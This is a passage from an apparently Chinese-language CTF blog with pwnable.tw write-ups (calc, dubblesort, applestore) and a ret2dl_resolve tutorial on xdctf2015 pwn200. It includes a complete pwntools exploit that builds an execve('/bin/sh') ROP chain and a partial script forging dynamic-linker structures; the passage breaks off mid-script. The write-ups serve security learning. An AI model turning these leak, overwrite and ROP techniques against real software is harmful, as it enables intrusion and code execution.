class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( opera_pool[v6] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; opera_pool[v6] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            opera_pool[++v6] = expr[opera_start_idx];   <span class="comment">// 前一个运算符是+-就先存下来</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(num_pool, opera_pool[v6]);     <span class="comment">// 前一个运算符为*/%直接算</span></span><br><span class="line">            opera_pool[v6] = expr[opera_start_idx];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(num_pool, opera_pool[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        opera_pool[v6] = expr[opera_start_idx];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !expr[opera_start_idx] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(num_pool, opera_pool[v6--]);<span class="comment">//把留下来的+-计算完</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​         <code>eval</code>的内容就是将<code>num_pool</code>的倒数两个数用<code>operator</code>计算一下存入倒数第二个数的位置并将<code>num_pool[0]</code>减一。</p><p>​        其中有一句<code>if ( expr[opera_start_idx] - (unsigned int)&#39;0&#39; &gt; 9 )// operator or \0</code>  不同类型进行运算时进行转换符合一套规则，完整可见《c++ primer plus》中文第六版p64。在这个表达式中两个操作数一个有符号，另一个无符号，无和有的级别相同，且有不能表示无的所有可能取值，前7条均不符合，故符合的应该是（8）将两个操作数都转换为有符号类型的无符号版本。</p><p>​      现在考虑有哪些没被排除的非法输入。（草其实我自己看是看不出来哪有问题的……）元素有两个，运算符和数。在对<code>num_pool</code>计算时将数的个数放在0的位置，可能导致个数被当成操作数进行计算。那么如何达成错开一个数的效果呢？可以考虑比一般情况少输入一个数。发现第一个元素为运算符的情况程序没有考虑。</p><p>​      输入+n时，第一次循环检测到+将+存入<code>opera_pool</code>，第二次将n存入<code>num_pool</code>[1,n]，计算结果<code>num_pool</code>[n+1,n]-&gt;[n,n]，返回``result[result[0]]=num_pool[n]`，我们可以用这个思路来泄露任意偏移栈上的内容。</p><p>​      而输入+x+n（x不为1）计算的结果都将是n。比如输入+10+1后按照程序逻辑，第一次循环检测到运算符+，将+存入<code>opera_pool</code>；第二次循环检测到第二个+，将x存入<code>num_pool</code>  [1,10]，再将+存入<code>opera_pool</code>，进入<code>eval</code>后<code>num_pool</code>变为[11,10]-&gt;[10,10]；进入第三次循环检测到结尾的<code>\0</code>，将n存入<code>num_pool</code>，此时<code>num_pool[11]</code>=1，再进行计算，<code>num_pool[10]=num_pool[10]+num_pool[11]=1</code>。而此时<code>opera_pool</code>已经为空了所以返回了<code>result[result[0]]=num_pool[10]=1</code>。利用这个思路达到任意偏移写。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>​      静态编译，考虑构造11号系统调用。（条件我还不知道是从哪来的…）粘自网络：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax = 11</span><br><span class="line">ebx = addr(&quot;/bin/sh&quot;)</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br></pre></td></tr></table></figure><p>​      由<code>int result[101]; // [esp+18h] [ebp-5A0h] BYREF</code>，<code>0x5a0/4=360</code>，我们得到了栈的基址即得到了写入<code>/bin/sh</code>的地址。查找rop链控制参数即可。写的时候注意两个地方，一个是栈上原有的数据可能干扰写入，一个是不能直接把0写进去，只要0在运算符后都被判<code>invalid</code>。我的处理办法是先从高地址往低写1，需要0时第二个运算符换成-就得到了0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *;<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">name=<span class="string">&#x27;./calc&#x27;</span></span><br><span class="line">f=ELF(name)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#p = process([&#x27;./ld&#x27;,name],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./_libc.so.6&#x27;&#125;)</span></span><br><span class="line">    p=process(name)</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27; , &#x27;splitw&#x27; , &#x27;-h&#x27;]</span></span><br><span class="line">one=[<span class="number">0x4527a</span>,<span class="number">0x45226</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num          :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l= <span class="keyword">lambda</span> x:log.success(x)</span><br><span class="line">dbg = <span class="keyword">lambda</span> :    gdb.attach(p,<span class="string">&quot;b *0x80493f2&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pa</span>(<span class="params">i,num</span>):</span><br><span class="line">    sl(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">360</span>+i)+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">eax=<span class="number">0x0805c34b</span></span><br><span class="line">edx_c_b=<span class="number">0x080701d0</span></span><br><span class="line">ecx_b=<span class="number">0x080701d1</span></span><br><span class="line">ebx_esi=<span class="number">0x0804a094</span></span><br><span class="line"></span><br><span class="line">int_80=<span class="number">0x08049a21</span></span><br><span class="line">sla(<span class="string">&#x27;===\n&#x27;</span>,flat(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;360&#x27;</span>))</span><br><span class="line">ebp=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))+<span class="number">0xffffffff</span>+<span class="number">1</span>-<span class="number">0x20</span></span><br><span class="line">log.info(<span class="string">&quot;ebp:&quot;</span>+<span class="built_in">hex</span>(ebp))</span><br><span class="line">log.info(<span class="string">&#x27;num_pool:&#x27;</span>+<span class="built_in">hex</span>(ebp-<span class="number">0x5a0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    pa(i,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">pa(<span class="number">12</span>+<span class="number">2</span>,<span class="number">0x68732f</span>)</span><br><span class="line">pa(<span class="number">11</span>+<span class="number">2</span>,<span class="number">0x6e69622f</span>)</span><br><span class="line">pa(<span class="number">10</span>+<span class="number">2</span>,int_80)</span><br><span class="line">sl(<span class="string">&#x27;+371-&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xffffffff</span>-ebp-<span class="number">46</span>-<span class="number">8</span>))</span><br><span class="line">pa(<span class="number">7</span>+<span class="number">2</span>,ebx_esi)</span><br><span class="line">sl(<span class="string">&#x27;+368-&#x27;</span>+<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pa(<span class="number">4</span>+<span class="number">2</span>,ecx_b)</span><br><span class="line">sl(<span class="string">&#x27;+364-&#x27;</span>+<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pa(<span class="number">0</span>+<span class="number">2</span>,edx_c_b)</span><br><span class="line">pa(<span class="number">1</span>,<span class="number">11</span>)</span><br><span class="line">pa(<span class="number">0</span>,eax)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><p>​      接收字符串打印并往栈上写东西。打印时用的是<code>printf</code>，遇到<code>\0</code>截断，考虑覆盖栈上内容带出来<code>libc</code>有关的内容。写的时候因为会对输入内容排序记得保证值不减小。这个地方的找偏移我长了点见识。</p><p>​      输入以后看栈上内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ tel 0xffba6b9c</span><br><span class="line">0000| 0xffba6b9c (&#x27;a&#x27; &lt;repeats 23 times&gt;, &quot;\n&quot;)</span><br><span class="line">0004| 0xffba6ba0 (&#x27;a&#x27; &lt;repeats 19 times&gt;, &quot;\n&quot;)</span><br><span class="line">0008| 0xffba6ba4 (&#x27;a&#x27; &lt;repeats 15 times&gt;, &quot;\n&quot;)</span><br><span class="line">0012| 0xffba6ba8 (&#x27;a&#x27; &lt;repeats 11 times&gt;, &quot;\n&quot;)</span><br><span class="line">0016| 0xffba6bac (&quot;aaaaaaa\n&quot;)</span><br><span class="line">0020| 0xffba6bb0 (&quot;aaa\n&quot;)</span><br><span class="line">0024| 0xffba6bb4 --&gt; 0xf7f3e000 --&gt; 0x1b2db0 </span><br><span class="line">0028| 0xffba6bb8 --&gt; 0xf7f3c244 --&gt; 0xf7da3030 (&lt;_IO_check_libio&gt;:)</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p>​      以0x28处的值为例。本地中它相对于<code>libc</code>的偏移为0x1b1244，执行<code>readelf -S /lib/i386-linux-gnu/libc-2.23.so</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[24] .tbss             NOBITS          001b1244 1b0244 000040 00 WAT  0   0  4</span><br></pre></td></tr></table></figure><p>​      于是对应到给的<code>libc</code>找出该段偏移。（啊不太懂为什么看Addr而不是Off）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[23] .tbss             NOBITS          001ae244 1ad244 000040 00 WAT  0   0  4</span><br></pre></td></tr></table></figure><h2 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h2><p>​      在<code>ida</code>里<code>view-&gt;open subviews-&gt;local types</code>，按下<code>insert</code>可以用C语言直接声明结构体，在变量处右键转换为结构体指针格式后整理出来的代码看着还是挺爽的。</p><img src="https://i.loli.net/2021/08/27/hcqWXSA7rpFtCVu.png" alt="image-20210827195805095.png" style="zoom:60%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: Apple Store\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: Add into your shopping cart\n&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: Remove from your shopping cart\n&quot;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: List your shopping cart\n&quot;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: Checkout\n&quot;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d: Exit\n&quot;</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>​        4个功能，（2）用<code>malloc</code>创建链表结点（3）删除结点（用的是<code>unlink</code>那一套（4）链表遍历打印购物车（5）结账。结账代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">checkout</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> total; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  item v2; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  total = cart();</span><br><span class="line">  <span class="keyword">if</span> ( total == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;*: iPhone 8 - $1&quot;</span>);</span><br><span class="line">    asprintf(&amp;v2.name, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;iPhone 8&quot;</span>);</span><br><span class="line">    v2.value = <span class="number">1</span>;</span><br><span class="line">    insert(&amp;v2);   <span class="comment">//v2位于栈上，将栈地址加入了链表</span></span><br><span class="line">    total = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%d\n&quot;</span>, total);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Want to checkout? Maybe next time!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​      实际上当<code>checkout</code>执行过一次后再遍历打印就会失败了，因为此时栈上此处变成了垃圾数据。而观察一下，<code>item v2; // [esp+18h] [ebp-20h] BYREF</code>，三个函数<code>add</code> <code>delete</code> <code>cart</code> 中都存在<code>char nptr[22]; // [esp+26h] [ebp-22h] BYREF</code>，而<code>my_read(nptr, 0x15u);</code>也就是说可以通过溢出写到最后这个结构体。</p><p>​      调用<code>cart</code>时将成员<code>name</code>写成<code>got</code>表项即可得到<code>libc</code>。接下来考虑怎么修改。思路不难和堆题的<code>unlink</code>联系起来。如果直接将<code>got</code>表项改成<code>system</code>地址，<code>system</code>处代码段为只读不可修改。可以考虑将<code>handler</code>的<code>ebp</code>劫持到<code>atoi</code>的 <code>got</code>表处，用<code>my_read(nptr, 0x15u);</code>修改。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://p1kk.github.io/">https://p1kk.github.io/</a></p><h2 id="一丢丢节省生命的调试技巧"><a href="#一丢丢节省生命的调试技巧" class="headerlink" title="一丢丢节省生命的调试技巧"></a>一丢丢节省生命的调试技巧</h2><p>​       如果想在打开调试窗口时自动执行多条gdb命令，可以在做题文件夹下创建<code>.gdbinit</code>文件，将命令以换行符分隔输入，在家目录下<code>.gdbinit</code>中加入<code>add-auto-load-safe-path ./</code>。这样在命令行进行gdb调试和gdb.attach时都能自动执行输入的命令。</p><p>​       多条命令一起执行也可定义函数，同样可在.gdbinit中输入↓  如果想走一步看一块内存或者干嘛而display又不是很方便的话可以这么做。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def func</span><br><span class="line">command</span><br><span class="line">...</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>以及，看了下做题时间。我有病吧，就因为一个<code>calc</code>卡了一年？？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;calc dubblesort applestore&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://ll1ng.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2dl_resolve</title>
    <link href="http://ll1ng.github.io/2021/03/28/ret2dl-resolve/"/>
    <id>http://ll1ng.github.io/2021/03/28/ret2dl-resolve/</id>
    <published>2021-03-27T17:23:52.000Z</published>
    <updated>2021-03-27T17:23:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;好久不见呀~<span id="more"></span><br><br><br>&emsp;&emsp;<code>ret2dl_resolve</code>与<code>FSOP</code>等同属于伪造结构体这种利用思路。（简单地划分在栈入门题里我觉得不是很合适…当然一定是因为我菜）本篇记录我调试的详细过程。题目是<code>xdctf2015</code>的<code>pwn200</code></p><h3 id="原理部分"><a href="#原理部分" class="headerlink" title="原理部分"></a>原理部分</h3><p>&emsp;&emsp;笔者理解过程主要依靠《程序员的自我修养》和《understanding elf》。下功夫去读源码自己构造是想依此来对动态链接过程有一个深刻的认识。学习结构体伪造这类利用方法时发现看源码应该是个必要的步骤…对结构体成员不熟悉很容易觉得题解天书。书本已经讲得比较详细了，再去引用难免有拾人牙慧之嫌。下面只记录一下自己的理解。<br><br>&emsp;&emsp;延迟绑定机制使得程序能够只为实际运行过程中被调用的符号进行绑定，且只在这些符号第一次被调用时花费时间去绑定，这能够有效提升程序运行速度减少不必要的资源浪费。实现这一过程的关键函数是<code>dl_runtime</code>。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>&emsp;&emsp;一开始尝试自己构造<code>link_map</code>的时候因为和构造段表的地方重叠，思路过于混乱，无数次在<code>_dl_runtime_resolve</code>中被检测到段错误非常心累。于是选择改掉原<code>link_map</code>中用来定位符号表、字符串表、重定位表的3个字段<code>link_map-&gt;l_info[DT_SYMTAB]</code>，<code>l_info[DT_STRTAB]</code>,<code>l_info[DT_JMPREL]</code>使它们指向我构造的三个表。<br><br>&emsp;&emsp;第一次链接时，向<code>dl_runtime</code>传入两个参数，一个是<code>link_map</code>，另一个是偏移<code>reloc_arg</code>。（这里不太明白<code>gdb</code>里看到是<code>_dl_runtime_resolve</code>，去<code>elf/dl-runtime.c</code>里看却好像是<code>_dl_fixup</code>）。总之<code>_dl_fixup</code>函数先通过对<code>link_map-&gt;l_info</code>表的索引获得三个表的地址。</p><blockquote><p>三个表的定义位于<code>elf/elf.h</code>中。</p></blockquote><p>指向这三个表的指针被存放在<code>l_info</code>数组中，其结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Swordd_tag;/* Dynamic entry type */</span><br><span class="line">  union</span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;/* Integer value */</span><br><span class="line">      Elf32_Addr d_ptr;/* Address value */</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这个结构体中<code>d_ptr</code>指向的就是表真正所在的地址。<br><br>&emsp;&emsp;<code>l_info[5]</code>：字符串表。直接用下标索引，不同字符串之间用<code>\0</code>分隔<br><br>&emsp;&emsp;<code>l_info[6]</code>：符号表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Wordst_name;/* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addrst_value;/* Symbol value */</span><br><span class="line">  Elf32_Wordst_size;/* Symbol size */</span><br><span class="line">  unsigned charst_info;/* Symbol type and binding */</span><br><span class="line">  unsigned charst_other;/* Symbol visibility */</span><br><span class="line">  Elf32_Sectionst_shndx;/* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p><br>&emsp;&emsp;<code>l_info[23]</code>：重定位表。（还有一个结构叫<code>Elf32_Rela</code>不知道区别是什么）<code>r_info&gt;&gt;4</code>得到其在符号表中的下标，检测<code>r_info&amp;0xf</code>是否和某个值相等，代码为<code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code>后面的宏和平台架构有关。（所以F12直接得到的1026并不正确）其值在<code>sysdeps/i386/dl-machine.h</code>中可以找到，为7。<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addrr_offset;/* Address */</span><br><span class="line">  Elf32_Wordr_info;/* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;整体流程为，由第二个参数<code>reloc_arg</code>加上重定位表地址得到对应的重定位表（加的时候加的应该不是<code>sizeof(Elf32_Rel)*reloc_arg</code>，直接就是<code>reloc_arg</code>）；由该重定位表的<code>r_info</code>得到其在符号表中下标；从符号表中的<code>st_name</code>字段得到对应的字符串地址，再从库中找到字符串所在地址填入对应重定位表的<code>r_offset</code>字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *;from LibcSearcher import *</span><br><span class="line">name=&#x27;./pwn200&#x27;</span><br><span class="line">f=ELF(name)</span><br><span class="line">if args.G:</span><br><span class="line">    p=remote(&quot;pwn.challenge.lctf.online&quot;,10002)</span><br><span class="line">else:</span><br><span class="line">    p = process(name)</span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27; , &#x27;splitw&#x27; , &#x27;-h&#x27;]</span><br><span class="line">one=[0x4527a,0x45226,0xf0364,0xf1207]</span><br><span class="line">s       = lambda data               :p.send(str(data))</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(delim, str(data))</span><br><span class="line">sl      = lambda data               :p.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num          :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,&#x27;\0&#x27;))</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,&#x27;\0&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l= lambda x:log.success(x)</span><br><span class="line">dbg = lambda :gdb.attach(p,&#x27;b *0x8048376&#x27;)</span><br><span class="line"></span><br><span class="line">bss=0x0804a000</span><br><span class="line">ret=0x80484bd</span><br><span class="line">resolve=0x8048376</span><br><span class="line">main=0x80484be</span><br><span class="line"></span><br><span class="line">str_offset=0xcc</span><br><span class="line">sym_offset=0xd4</span><br><span class="line">rel_offset=0xf4</span><br><span class="line">link_map=0x8049ff8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake=flat(0,0,# 0x0</span><br><span class="line">0,0,0,0,0,0,0,0,0,# .dynamic 0x8</span><br><span class="line">0,0,# bss+0x42c</span><br><span class="line">0,0,# bss+0x434</span><br><span class="line">0,0,# bss+0x43c</span><br><span class="line">0,0,# bss+0x444</span><br><span class="line">0,bss+0x400+str_offset,   # bss+0x44c[5]</span><br><span class="line">0,bss+0x400+sym_offset,  # bss+0x454[6]</span><br><span class="line">0xa,0x64, # bss+0x45c</span><br><span class="line">0xb,0x10, # bss+0x464</span><br><span class="line">0x15,bss+0x48c, # in libc bss+0x46c</span><br><span class="line">3,0x8049ff4, # bss+0x474</span><br><span class="line">bss+0x48c, 0x28, # bss+0x47c</span><br><span class="line">0x14,0x11, # bss +0x484</span><br><span class="line">0x0,bss+0x400+rel_offset,#17 jmprel  bss+0x48c[23]</span><br><span class="line">0x11,0x8048300,  # bss+0x494</span><br><span class="line">bss+0x400+rel_offset-0x10,0x18,  # bss+0x49c</span><br><span class="line">0x13,0x8,    # bss+0x4a4</span><br><span class="line">0x6ffffffe,0x80482e0, # bss+0x4ac</span><br><span 